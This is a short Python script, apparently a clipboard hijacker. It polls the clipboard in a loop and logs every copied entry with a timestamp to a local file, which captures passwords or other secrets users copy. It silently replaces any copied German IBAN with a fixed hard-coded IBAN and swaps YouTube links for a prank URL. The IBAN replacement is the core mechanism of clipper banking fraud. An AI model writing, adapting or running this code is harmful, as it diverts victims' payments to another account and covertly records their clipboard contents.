import re, pyperclip
from datetime import datetime

def log(logfile, daten):
  with open(logfile, "a") as datei:
    t = datetime.now()
    datei.write(f"{t.strftime('%m/%d/%Y,%H:%M:%S')}-{daten}\n")
    
def mod_iban():
  fake_iban = "DE96790700166165546734"
  pyperclip.copy(fake_iban)

def mod_url():
  fake_url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
  pyperclip.copy(fake_url)

if __name__ == "__main__":
  logfile = "logfile.txt"
  clipboard_kopie = pyperclip.paste()
  
  while True:
    daten = pyperclip.paste()
    if daten != "None" and daten != clipboard_kopie:
      log(logfile, daten)
      clipboard_kopie = pyperclip.paste()
      if re.match("DE[0-9]{20}", daten):
        mod_iban()
      elif "www.youtube.com" in daten:
        mod_url()